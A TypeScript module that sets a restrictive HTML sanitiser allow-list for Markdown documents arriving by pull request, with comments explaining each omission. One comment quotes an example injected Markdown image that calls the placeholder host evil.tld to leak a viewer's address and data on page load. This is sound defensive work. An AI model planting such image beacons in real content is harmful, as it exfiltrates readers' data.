import { defaultSchema } from "rehype-sanitize";

/**
 * The sanitiser's allow-list, in its own module so the renderer exports nothing
 * but a component — and so a test can assert against the same object the page
 * renders with rather than a copy of it.
 *
 * The catalogue renders Markdown that arrives by pull request. Review is the
 * first control and this is the second, because a reviewer reading a diff of a
 * 400-line contract is looking at prose, not at an injection three screens
 * down. `defaultSchema` is GitHub-shaped and more permissive than a document
 * needs: it allows `img` from any origin, `div`, `section`, `input`, and a long
 * wildcard attribute list. This narrows it to the tags these documents use.
 *
 * `img` is absent on purpose, and it is the interesting omission. With no
 * JavaScript at all, an injected `![](https://evil.tld/p.png?q=…)` fires a
 * request the moment anyone opens the page, leaking their address and whatever
 * the injection persuaded the author to put in the path. Links cannot be
 * dropped — they are half the point of a contract — so they are annotated with
 * their host instead, in the renderer.
 *
 * `h1` is absent for a different reason: the sheet already prints the entry's
 * name as its heading, and a document whose first line repeats it would render
 * the same title twice.
 */
export const documentSchema = {
  ...defaultSchema,
  tagNames: [
    "p",
    "br",
    "strong",
    "em",
    "del",
    "code",
    "pre",
    "blockquote",
    "ul",
    "ol",
    "li",
    "a",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
  ],
  attributes: {
    a: ["href"],
    th: ["align"],
    td: ["align"],
    // The wildcard list is dropped entirely rather than trimmed. className is
    // not on it: there is no highlighter here, so a class on a code block buys
    // nothing and lets content reach into the page's styling.
    "*": [],
  },
  protocols: {
    // defaultSchema also permits irc, ircs and xmpp.
    href: ["http", "https", "mailto"],
  },
  strip: ["script", "style"],
};
